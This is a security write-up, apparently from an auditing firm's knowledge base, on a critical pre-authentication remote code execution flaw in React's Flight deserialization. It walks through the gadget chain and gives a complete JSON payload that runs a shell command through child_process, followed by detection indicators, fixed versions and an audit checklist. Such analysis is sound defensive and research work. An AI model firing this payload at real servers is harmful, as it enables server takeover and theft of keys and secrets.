# React Flight Deserialization Gadget Chain (CVE-2025-55182)

## Pattern: Framework Internal Object Gadget Chain -> RCE
**Severity:** Critical (CVSS 10.0)
**Category:** Deserialization -> Gadget Chain -> Remote Code Execution
**Affects:** Any JavaScript framework with custom deserialization exposing internal objects

## The Vulnerability
React's Flight protocol deserializes client-sent data into server-side objects. The `$@` prefix handler returns raw Chunk objects (React internals) to the deserializer. By creating self-referencing chunks, an attacker can traverse JavaScript's prototype chain from a Chunk object -> Function constructor -> arbitrary code execution.

## Exploit Chain (4 Stages)

### Stage 1: Internal Object Exposure
**Trigger:** `$@` prefix in `parseModelString` returns raw `Chunk` object via `getChunk()`
```javascript
case '@': {
  const id = parseInt(value.slice(2), 16);
  const chunk = getChunk(response, id); // Returns RAW internal object
  return chunk;
}
```
**Gadget:** Chunk objects have: `status`, `value`, `reason`, `_response`, `then` (from Promise.prototype subclass)

### Stage 2: Automatic Execution via .then
**Trigger:** JavaScript's `await`/Promise resolution calls `.then()` on any object that has it
**Gadget:** `Chunk.prototype.then` calls `initializeModelChunk(chunk)` when `status === "resolved_model"`

### Stage 3: Controlled Initialization
**Trigger:** Attacker sets `status: "resolved_model"` and `value: '{"then":"$B"}'`
**Gadget:** `initializeModelChunk` does `JSON.parse(chunk.value)` and processes result through `reviveModel`

### Stage 4: Code Execution via Blob Handler
**Trigger:** `$B` prefix in parseModelString:
```javascript
case 'B': {
  const id = parseInt(value.slice(2), 16);
  return response._formData.get(response._prefix + id);
}
```
**Gadget:** By setting `_formData.get` to the `Function` constructor (reachable via `$1:then:constructor`), the call becomes `Function("malicious_code//chunk_id")()`

## Minimum Viable Payload
```json
{
  "0": "{\"status\":\"resolved_model\",\"reason\":-1,\"_response\":{\"_prefix\":\"process.mainModule.require('child_process').execSync('id')//\",\"_formData\":{\"get\":\"$1:then:constructor\"}},\"then\":\"$1:then\",\"value\":\"{\\\"then\\\":\\\"$B\\\"}\"}",
  "1": "\"$@0\""
}
```

## Key Chain: `$1:then:constructor`
1. `$1` -> Go to chunk 1 (which self-references chunk 0)
2. `:then` -> Access the `then` property (Chunk.prototype.then, a function)
3. `:constructor` -> Get Function constructor (every function's constructor is Function)

## Detection Indicators
- HTTP POST with `Next-Action` header (any value triggers vulnerable path)
- FormData containing `$@` references (self-referencing chunks)
- FormData containing `$B` prefix with `_formData.get` pointing to constructor chain
- Payloads containing `process.mainModule.require` or `child_process`

## Why Pre-Authentication
The deserialization occurs in `decodeReply()` / `decodeAction()` BEFORE the server action function is resolved or validated. Any endpoint that accepts RSC payloads is vulnerable, regardless of application-level auth.

## Fix Applied
- React 19.0.1, 19.1.2, 19.2.1
- Sanitize chunk properties before returning from `$@` handler
- Prevent self-referencing chunks
- Use safe `Object.prototype.hasOwnProperty.call()` in compiled output

## Audit Checklist for Similar Patterns
- [ ] Does the deserializer expose internal/framework objects?
- [ ] Can references create circular/self-referencing structures?
- [ ] Are there type handlers that call methods on controlled objects?
- [ ] Can attacker reach a function reference? (-> .constructor -> Function)
- [ ] Does deserialization happen before authentication?
- [ ] Does compiled/minified output differ from source (unsafe patterns)?

## Zealynx Relevance
- **Web3 frontends using Next.js/React:** Most DeFi/NFT frontends use Next.js
- **Pre-auth RCE means:** An attacker can compromise DeFi frontend servers, potentially:
  - Steal environment variables (private keys, API keys)
  - Modify frontend to inject malicious wallet addresses
  - Access cloud metadata for lateral movement
  - Deploy persistent backdoors
- **Pentest checklist item:** For any Web3 client audit with React frontend, check RSC version
